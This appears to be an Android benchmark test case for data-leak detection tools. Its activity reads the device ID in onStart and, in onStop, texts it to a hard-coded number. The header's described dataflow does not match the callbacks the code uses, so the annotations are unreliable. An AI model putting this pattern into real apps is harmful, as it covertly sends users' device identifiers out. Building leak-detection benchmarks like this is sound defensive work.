package edu.uta;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

/**
 * s
 *  @testcase_name Lifecycle_ActivityEventSequence2
 *
 *  @description   Testing if information leak due to triggering a sequence of events (not activity callbacks) can be detected. Each event can invoke a sequence of callbacks in the activity.
 *  @dataflow onResume :source -> onSaveInstanceState -> onRestoreInstanceState -> onResume: sink
 *  @number_of_leaks 1
 *  @challenges  The analysis tool must be able to detect data leaks which are triggered by different ordering of event sequences. Each event in the event sequence invokes a set of callbacks in a specific order. Following attack occurs when onUserLeaveHint() -> onUserLeaveHint()->onSaveInstanceState()->onRestoreInstanceState()->onSaveInstanceState() callbacks are invoked in the given order.
 */
public class ActivityEventSequence2 extends Activity {

    private String d1 = "";

    private String recpNo = "5556";

    @Override
    public void onStart() {
        TelephonyManager tMgr = (TelephonyManager) getApplicationContext().getSystemService(TELEPHONY_SERVICE);
        this.d1 = tMgr.getDeviceId();
    }

    @Override
    public void onStop() {
        if (!d1.isEmpty())
            SmsManager.getDefault().sendTextMessage(recpNo, null, d1, null, null);
    }
}
